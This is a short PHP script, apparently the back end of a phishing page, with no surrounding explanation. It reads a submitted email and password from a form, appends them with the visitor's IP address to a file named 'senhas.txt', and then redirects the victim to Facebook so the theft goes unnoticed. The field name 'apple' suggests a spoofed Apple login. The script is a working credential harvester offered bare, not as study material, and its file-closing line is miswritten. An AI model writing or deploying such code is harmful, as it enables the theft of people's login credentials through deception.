<?php
$usuario = $_POST['apple'];
$senha = $_POST['pw'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "Email: ".$usuario." - Senha: ".$senha." - IP: ".$ip."<br>";
 
$fp = fopen("senhas.txt", "a");
fwrite($fp, $tudo);
$fclose($fp);
header("Location: http://www.facebook.com");
?>